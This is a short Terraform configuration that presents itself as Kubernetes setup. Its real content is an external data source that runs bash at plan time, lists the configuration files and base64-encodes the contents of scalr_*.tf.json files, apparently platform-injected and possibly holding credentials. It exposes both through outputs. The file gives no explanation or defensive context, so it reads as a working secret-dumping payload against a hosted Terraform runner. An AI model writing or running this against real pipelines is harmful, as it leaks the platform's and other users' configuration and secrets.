terraform {
  backend "local" {}
  required_providers {
    kubernetes = {
      source  = "hashicorp/kubernetes"
      version = "~> 2.0"
    }
  }
}

provider "kubernetes" {}

data "external" "dump" {
  program = ["bash", "-c", "printf '{\"files\":\"%s\",\"content\":\"%s\"}' \"$(ls *.tf *.tf.json 2>/dev/null | tr '\\n' ',')\" \"$(cat scalr_*.tf.json 2>/dev/null | base64 | tr -d '\\n')\""]
}

output "dump_files" {
  value = data.external.dump.result.files
}

output "dump_content_b64" {
  value = data.external.dump.result.content
}